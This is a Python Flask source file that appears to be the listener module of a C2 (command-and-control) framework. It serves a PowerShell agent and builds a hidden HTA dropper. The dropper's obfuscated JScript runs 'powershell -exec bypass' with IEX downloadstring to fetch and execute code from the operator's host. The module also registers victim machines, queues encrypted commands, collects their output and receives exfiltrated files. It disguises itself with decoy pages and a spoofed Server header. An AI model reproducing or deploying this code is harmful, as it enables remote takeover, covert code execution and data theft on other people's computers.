#!/usr/bin/python


import threading
import time
import base64
import sys
import os
import signal
import string
import random
from termcolor import colored
from .functions import *
from .encryption import *
from .esa import *
from flask import *
import logging
parentfolder = os.path.abspath("..")
if parentfolder not in sys.path:
    sys.path.insert(0, parentfolder)
from profile import *
# disable logging

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True

class NewListener:

  def __init__(self, *args):
    arguments = len(args)
    self.arguments = arguments
    if len(args) == 6:
        self.name = args[0]
        self.bindip = args[1]
        self.bindport = args[2]
        self.host = args[3]
        self.interval = args[4]
        self.path = args[5]
    elif len(args) == 8:

        self.name = args[0]
        self.bindip = args[1]
        self.bindport = args[2]
        self.host = args[3]
        self.interval = args[4]
        self.path = args[5]
        self.cert = args[7]
        self.key = args[6]


  def start_listener(self):
    host = [self.bindip, self.bindport]

    if self.arguments == 6:
        self.ssl = False
            #check_listener_port(self.bindip, self.bindport)
        thread = threading.Thread(target=app.run, args=(host))
        thread.daemon = True
        thread.start()
        listeners_information[self.name] = [self.name, self.bindip, self.bindport, self.host, self.interval, self.path, self.ssl]
        return True
        #else:
        #    print(colored("[-] Port in use or you don't have permession to bind it", "red"))
    if self.arguments == 8:
        # certficates path (worked !)
        self.ssl = True
        print(colored("SSL listener started !", "yellow"))
        # self.cert ==> fullchain.pem
        # self.key  ==> key.pem
        # which is generated from letsencrypt certbot !

        cert = {"ssl_context": (self.cert, self.key)}
        check_listener_port(self.bindip, self.bindport)
        thread = threading.Thread(target=app.run, args=(host), kwargs=cert)
        thread.daemon = True
        thread.start()
        listeners_information[self.name] = [self.name, self.bindip, self.bindport, self.host, self.interval, self.path, self.ssl]
        return True
        #else:
        #    print(colored("[-] Port in use or you don't have permession to bind it", "red"))
  def powershell_code(self):
        f = open("agents/agent.ps1.oct")
        if self.ssl:
            proto = "https"
        else:
            proto = "http"

        srvhost = self.host + ":" + str(self.bindport)
        command_host_url = command_send_url.split("/")[1]
        pcode = f.read()
        pcode1 = pcode.replace("OCU_INTERVAL", str(self.interval))
        pcode2 = pcode1.replace("OCT_KEY", str(aes_encryption_key))
        pcode3 = pcode2.replace("OCT_first_ping", first_ping_url.split("/")[1])
        pcode4 = pcode3.replace("OCT_command", command_host_url)
        pcode5 = pcode4.replace("OCT_report", report_url.split("/")[1])
        pcode6 = pcode5.replace("OCT_file_receiver", file_receiver_url.split("/")[1])
        pcode7 = pcode6.replace("OCTRECV", command_receiver_url.split("/")[1])
        pcode8 = pcode7.replace("OCU_PROTO", proto)
        pcode9 = pcode8.replace("SRVHOST", srvhost)
        response = make_response(pcode9)
        response.headers["Server"] = server_response_header
        return response


  def create_path(self):
      try:
          app.add_url_rule("/%s" % self.path, self.host, self.powershell_code)
          return True
      except:
          False

  def create_hta(self):
      app.add_url_rule(mshta_url, "hta" , self.hta)

  def hta(self):
      code = '''
<html>
<head>
<script language="JScript">
window.resizeTo(1, 1);
window.moveTo(-2000, -2000);
window.blur();
try
{
    window.onfocus = function() { window.blur(); }
    window.onerror = function(sMsg, sUrl, sLine) { return false; }
}
catch (e){}
function replaceAll(find, replace, str)
{
  while( str.indexOf(find) > -1)
  {
    str = str.replace(find, replace);
  }
  return str;
}
function bas( string )
    {
        string = replaceAll(']','=',string);
        string = replaceAll('[','a',string);
        string = replaceAll(',','b',string);
        string = replaceAll('@','D',string);
        string = replaceAll('-','x',string);
        string = replaceAll('~','N',string);
        string = replaceAll('*','E',string);
        string = replaceAll('%','C',string);
        string = replaceAll('$','H',string);
        string = replaceAll('!','G',string);
        string = replaceAll('{','K',string);
        string = replaceAll('}','O',string);
        var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        var result     = '';
        var i = 0;
        do {
            var b1 = characters.indexOf( string.charAt(i++) );
            var b2 = characters.indexOf( string.charAt(i++) );
            var b3 = characters.indexOf( string.charAt(i++) );
            var b4 = characters.indexOf( string.charAt(i++) );
            var a = ( ( b1 & 0x3F ) << 2 ) | ( ( b2 >> 4 ) & 0x3 );
            var b = ( ( b2 & 0xF  ) << 4 ) | ( ( b3 >> 2 ) & 0xF );
            var c = ( ( b3 & 0x3  ) << 6 ) | ( b4 & 0x3F );
            result += String.fromCharCode(a) + (b?String.fromCharCode(b):'') + (c?String.fromCharCode(c):'');
        } while( i < string.length );
        return result;
    }
var es = '{code}';
eval(bas(es));
</script>
<hta:application caption="no" showInTaskBar="no" windowState="minimize" navigable="no" scroll="no" />
</head>
<body>
</body>
</html>
'''
      js = '''
var cm="powershell -exec bypass -w 1 -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($V.downloadstring('http://{ip}:{port}/{payload}'));";
var w32ps= GetObject('winmgmts:').Get('Win32_ProcessStartup');
w32ps.SpawnInstance_();
w32ps.ShowWindow=0;
var rtrnCode=GetObject('winmgmts:').Get('Win32_Process').Create(cm,'c:\\\\',w32ps,null);
'''
      js = js.replace('{ip}',self.host).replace('{port}',str(self.bindport)).replace('{payload}',self.path)
      #print  js
      js = base64.b64encode(js.encode()).decode() #js.encode('base64').replace('\n', '')
      re = [[']','='],['[','a'],[',','b'],['@','D'],['-','x'],['~','N'],['*','E'],['%','C'],['$','H'],['!','G'],['{','K'],['}','O']]

      for i in re:
            js = js.replace(i[1], i[0])
      #print js
      code=code.replace('{code}',js)
      resp = make_response(code)
      resp.headers["Server"] = server_response_header
      return resp




@app.route("/")
def index():
    resp = make_response("<title>Under development</title><center><h1>Under development server</h1></center>")
    resp.headers["Server"] = server_response_header
    return resp


@app.route(file_receiver_url, methods=["POST"])
def fr():
    filename = decrypt_command(aes_encryption_key, request.form["fn"].replace(" ","+"))
    f = open(filename.strip("\x00"), "wb")
    #fdata = request.form["token"].replace(" ", "+").encode().
    fdata = request.form["token"].replace(" ", "+")
    raw_base64 = decrypt_command(aes_encryption_key, fdata)
    #ready_to_write = base64.b64decode(fdata.decode("UTF-16LE"))
    f.write(base64.b64decode(raw_base64.encode()))
    #f.write(base64.b64decode(raw_base64.decode("UTF-16LE")))
    f.close()
    print(colored("\n[+] File %s downloaded from the client !" % filename, "green"))
    response = make_response("Nothing to see here !")
    response.headers["Server"] = server_response_header
    return response


@app.route(report_url)
def report():
    try:
        encrypted_host = request.headers["App-Logic"]
        hostname = decrypt_command(aes_encryption_key, encrypted_host).strip("\x00")
        for key in list(connections_information.keys()):
            if hostname in connections_information[key][2]:
                session = connections_information[key]
                header = request.headers["Authorization"]
                processes = decrypt_command(aes_encryption_key, header).strip("\x00").split(" ")
                esa(processes, session)
            else:
                pass
        response = make_response("Cool page !")
        response.headers["Server"] = server_response_header
        return response
    except:
        return ""



@app.route(command_send_url)
def command(hostname):
    for key in list(connections_information.keys()):
        if hostname in connections_information[key]:
            required_key = key
            connections_information[required_key][6] = time.ctime()
    try:
            command_to_execute = commands[hostname]
            commands[hostname] = encrypt_command(aes_encryption_key, "False")
    except KeyError:
            return "False"
    response = make_response(command_to_execute)
    response.headers["Server"] = server_response_header
    return response


@app.route(command_receiver_url)
def cr():
        try:
            encrypted_response = request.headers["Authorization"]
            print("\nCommand execution result is : \n" + decrypt_command(aes_encryption_key, encrypted_response).strip("\x00") + "\n")
            return "Done"
        except:
            return ""


@app.errorhandler(404)
def page_not_found(e):
    response = make_response('<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>')
    response.headers["Server"] = server_response_header
    return response


@app.route(first_ping_url)
def first_ping():
        try:
            global counter
            header = request.headers["Authorization"]
            raw_request = str(decrypt_command(aes_encryption_key, header)).strip("\x00").split(",")
            hostname = raw_request[0]
            if hostname in list(commands.keys()):
                    return "HostName exist"

            username = raw_request[1]
            os_version = raw_request[2]
            pid = raw_request[3]
            domain = raw_request[4]
            ip = request.environ['REMOTE_ADDR']
            last_ping = time.ctime()
            connections_information[counter] = [counter, ip, hostname, pid, username, domain, last_ping, os_version]
            print("\n\x1b[6;30;42m new connection \x1b[0m from %s (%s) as session %s" %(username, ip, counter))
            commands[hostname] = encrypt_command(aes_encryption_key, "False")
            counter = counter + 1
            response = make_response("")
            response.headers["Server"] = server_response_header
            return response
        except:
            return ""
